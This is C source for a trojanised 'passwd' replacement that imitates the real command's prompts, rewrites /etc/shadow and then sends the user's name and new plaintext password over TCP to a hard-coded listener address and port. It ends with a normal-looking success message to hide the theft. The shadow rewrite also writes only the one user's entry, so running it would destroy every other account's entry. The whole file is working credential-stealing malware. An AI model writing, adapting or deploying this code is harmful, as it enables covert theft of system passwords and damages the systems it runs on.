#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <shadow.h>
#include <crypt.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#define LISTENER_IP "ADD THE LISTENER IP"
#define LISTENER_PORT 47022

void send_password(const char *user, const char *password) {
    int sockfd;
    struct sockaddr_in listener_addr;
    char buffer[256];

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return;
    }

    memset(&listener_addr, 0, sizeof(listener_addr));
    listener_addr.sin_family = AF_INET;
    listener_addr.sin_addr.s_addr = inet_addr(LISTENER_IP);
    listener_addr.sin_port = htons(LISTENER_PORT);

    if (connect(sockfd, (struct sockaddr *)&listener_addr, sizeof(listener_addr)) < 0) {
        perror("Connection failed");
        close(sockfd);
        return;
    }

    snprintf(buffer, sizeof(buffer), "User: %s Password: %s\n", user, password);
    send(sockfd, buffer, strlen(buffer), 0);
    close(sockfd);
}

int update_password(const char *user, const char *new_password) {
    struct spwd *spw;
    char *encrypted_password;
    FILE *shadow;
    struct stat statbuf;
    int shadow_fd;
    char *shadow_tmp = "/etc/shadow.tmp";
    
    // Read the current shadow entry for the user
    spw = getspnam(user);
    if (spw == NULL) {
        fprintf(stderr, "Failed to retrieve shadow entry for user %s\n", user);
        return 1;
    }

    // Encrypt the new password
    encrypted_password = crypt(new_password, spw->sp_pwdp);
    if (encrypted_password == NULL) {
        perror("crypt");
        return 1;
    }

    // Create a temporary shadow file with updated password
    shadow_fd = open(shadow_tmp, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (shadow_fd < 0) {
        perror("open");
        return 1;
    }

    shadow = fdopen(shadow_fd, "w");
    if (shadow == NULL) {
        perror("fdopen");
        close(shadow_fd);
        return 1;
    }

    // Get file status of the original shadow file for later use
    if (stat("/etc/shadow", &statbuf) < 0) {
        perror("stat");
        fclose(shadow);
        return 1;
    }

    // Update the shadow file with the new password
    spw->sp_pwdp = encrypted_password;
    fprintf(shadow, "%s:%s:%ld:%ld:%ld:%ld:%ld:%ld:%ld\n", spw->sp_namp, spw->sp_pwdp, spw->sp_lstchg,
            spw->sp_min, spw->sp_max, spw->sp_warn, spw->sp_inact, spw->sp_expire, spw->sp_flag);

    fclose(shadow);

    // Replace the original shadow file with the updated one
    if (rename(shadow_tmp, "/etc/shadow") < 0) {
        perror("rename");
        unlink(shadow_tmp);
        return 1;
    }

    // Set the appropriate permissions on the new shadow file
    if (chmod("/etc/shadow", statbuf.st_mode) < 0 || chown("/etc/shadow", statbuf.st_uid, statbuf.st_gid) < 0) {
        perror("chmod/chown");
        return 1;
    }

    return 0;
}

int main(int argc, char *argv[]) {
    const char *user = getlogin();

    // Intercept and prompt for the current password
    printf("Current password: ");
    char *current_password = getpass("");
    if (!current_password) {
        fprintf(stderr, "Failed to read current password\n");
        return 1;
    }

    // Intercept and prompt for the new password
    printf("New password: ");
    char *new_password = getpass("");
    if (!new_password) {
        fprintf(stderr, "Failed to read new password\n");
        return 1;
    }

    // Intercept and prompt to retype the new password
    printf("Retype new password: ");
    char *retyped_password = getpass("");
    if (!retyped_password) {
        fprintf(stderr, "Failed to read retyped password\n");
        return 1;
    }

    // Verify the new passwords match
    if (strcmp(new_password, retyped_password) != 0) {
        fprintf(stderr, "Passwords do not match\n");
        return 1;
    }

    // Update the password
    if (update_password(user, new_password) != 0) {
        fprintf(stderr, "Failed to update password\n");
        return 1;
    }

    send_password(user, new_password);

    printf("passwd: password updated successfully\n");

    return 0;
}
